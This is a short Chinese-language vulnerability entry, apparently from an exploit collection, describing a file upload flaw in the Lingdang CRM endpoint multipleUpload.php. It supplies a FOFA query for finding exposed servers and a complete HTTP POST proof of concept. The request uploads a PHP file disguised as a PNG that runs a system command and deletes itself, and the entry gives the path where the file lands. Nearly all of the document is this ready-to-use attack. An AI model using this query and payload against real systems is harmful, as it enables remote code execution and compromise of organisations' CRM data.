# 灵当CRM系统接口multipleUpload.php文件上传漏洞

灵当CRM系统接口multipleUpload.php文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```

## poc

```javascript
POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR

------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/png

<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundaryj7OlOPiiukkdktZR--
```

![image-20240923093829498](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409230938562.png)

文件路径`/crm/storage/2024/September/week2/1.php`